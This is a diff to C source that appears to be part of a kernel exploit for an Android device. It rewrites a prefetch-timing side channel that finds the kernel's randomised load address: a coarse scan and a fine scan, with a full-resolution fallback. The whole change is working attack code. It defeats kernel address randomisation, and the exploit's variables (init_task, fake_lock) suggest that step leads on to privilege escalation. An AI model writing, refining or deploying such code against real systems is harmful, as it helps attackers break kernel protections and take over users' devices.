@@ -27,6 +27,17 @@
 #define PREFETCH_EDGE_RUN 8
 #define PREFETCH_REPEATS 3
 
+/* Two-pass slide scan: bracket the image edge coarsely, then refine it at the
+ * full PREFETCH_SCAN_STEP.  A coarse transition needs very few high samples to
+ * be recorded; the fine pass re-validates with the full edge-run before it is
+ * trusted.  The window is sized so the fine pass always sees PREFETCH_EDGE_RUN
+ * unmapped samples before the edge and PREFETCH_EDGE_RUN mapped ones after it,
+ * while coarse accuracy (PREFETCH_COARSE_STEP) bounds where the true edge sits.
+ */
+#define PREFETCH_COARSE_STEP 0x40000ULL
+#define PREFETCH_COARSE_EDGE_RUN 2
+#define PREFETCH_FINE_MARGIN (2 * PREFETCH_COARSE_STEP)
+
 static uint64_t init_task;
 static uint64_t fake_lock;
 static uint32_t f_wait;
@@ -131,15 +142,60 @@ static void measure_triplet(uintptr_t candidate, uintptr_t mapped,
   *unmapped_q = unmapped_samples[3];
 }
 
+/*
+ * Single-pass edge scanner.  Walks [start, end] in `step` increments and
+ * records the offset where the kernel-image prefetch time crosses from
+ * "unmapped" to "mapped", requiring `edge_run` consecutive unmapped samples
+ * before the crossing and `edge_run` consecutive mapped ones after it.
+ * Returns the edge offset or UINT64_MAX when no trustworthy edge is found.
+ */
+static uint64_t scan_edge(uint64_t start, uint64_t end, uint64_t step,
+                          unsigned edge_run, uintptr_t mapped_address,
+                          uintptr_t unmapped_address) {
+  uint64_t edge = UINT64_MAX;
+  unsigned high_run = 0;
+  unsigned low_run = 0;
+
+  for (uint64_t offset = start; offset <= end; offset += step) {
+    uint64_t candidate_q;
+    uint64_t local_mapped;
+    uint64_t local_unmapped;
+    uint64_t threshold;
+
+    measure_triplet(KIMAGE_TEXT_BASE + offset, mapped_address, unmapped_address,
+                    &candidate_q, &local_mapped, &local_unmapped);
+    if (local_unmapped <= local_mapped || local_unmapped - local_mapped < 8 ||
+        local_unmapped - local_mapped < local_mapped / 2) {
+      high_run = 0;
+      low_run = 0;
+      continue;
+    }
+    threshold = local_mapped + (local_unmapped - local_mapped) / 2;
+    if (candidate_q > threshold) {
+      low_run = 0;
+      high_run = high_run < edge_run ? high_run + 1 : edge_run;
+    } else if (high_run >= edge_run) {
+      if (!low_run)
+        edge = offset;
+      if (++low_run >= edge_run)
+        break;
+    } else {
+      high_run = 0;
+    }
+  }
+  return edge;
+}
+
 static uint64_t find_slide_once(void) {
   unsigned char *unmapped;
   uintptr_t mapped_address = (uintptr_t)&measure_prefetch;
   uintptr_t unmapped_address;
   uint64_t mapped_q;
   uint64_t unmapped_q;
-  uint64_t edge = UINT64_MAX;
-  unsigned high_run = 0;
-  unsigned low_run = 0;
+  uint64_t coarse;
+  uint64_t fine;
+  uint64_t fine_start;
+  uint64_t fine_end;
 
   unmapped = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
@@ -158,38 +214,26 @@ static uint64_t find_slide_once(void) {
     fail("prefetch controls");
   }
 
-  for (uint64_t offset = 0; offset <= MAX_PHYSICAL_SLIDE;
-       offset += PREFETCH_SCAN_STEP) {
-    uint64_t candidate_q;
-    uint64_t local_mapped;
-    uint64_t local_unmapped;
-    uint64_t threshold;
-
-    measure_triplet(KIMAGE_TEXT_BASE + offset, mapped_address, unmapped_address,
-                    &candidate_q, &local_mapped, &local_unmapped);
-    if (local_unmapped <= local_mapped || local_unmapped - local_mapped < 8 ||
-        local_unmapped - local_mapped < local_mapped / 2) {
-      high_run = 0;
-      low_run = 0;
-      continue;
-    }
-    threshold = local_mapped + (local_unmapped - local_mapped) / 2;
-    if (candidate_q > threshold) {
-      low_run = 0;
-      high_run =
-          high_run < PREFETCH_EDGE_RUN ? high_run + 1 : PREFETCH_EDGE_RUN;
-    } else if (high_run >= PREFETCH_EDGE_RUN) {
-      if (!low_run)
-        edge = offset;
-      if (++low_run >= PREFETCH_EDGE_RUN)
-        break;
-    } else {
-      high_run = 0;
-    }
-    if (offset > MAX_PHYSICAL_SLIDE - PREFETCH_SCAN_STEP)
-      break;
+  coarse = scan_edge(0, MAX_PHYSICAL_SLIDE, PREFETCH_COARSE_STEP,
+                     PREFETCH_COARSE_EDGE_RUN, mapped_address,
+                     unmapped_address);
+  if (coarse != UINT64_MAX) {
+    fine_start =
+        coarse >= PREFETCH_FINE_MARGIN ? coarse - PREFETCH_FINE_MARGIN : 0;
+    fine_end = coarse + PREFETCH_FINE_MARGIN;
+    if (fine_end > MAX_PHYSICAL_SLIDE)
+      fine_end = MAX_PHYSICAL_SLIDE;
+    fine = scan_edge(fine_start, fine_end, PREFETCH_SCAN_STEP,
+                     PREFETCH_EDGE_RUN, mapped_address, unmapped_address);
+    if (fine != UINT64_MAX)
+      return fine;
   }
-  return edge;
+
+  /* Fall back to the full-resolution single pass.  This covers unusually
+   * small slides whose run-up does not fit inside the fine window, and any
+   * slides too small for the coarse pass to bracket at all. */
+  return scan_edge(0, MAX_PHYSICAL_SLIDE, PREFETCH_SCAN_STEP, PREFETCH_EDGE_RUN,
+                   mapped_address, unmapped_address);
 }
 
 uint64_t a536_find_slide(void) {
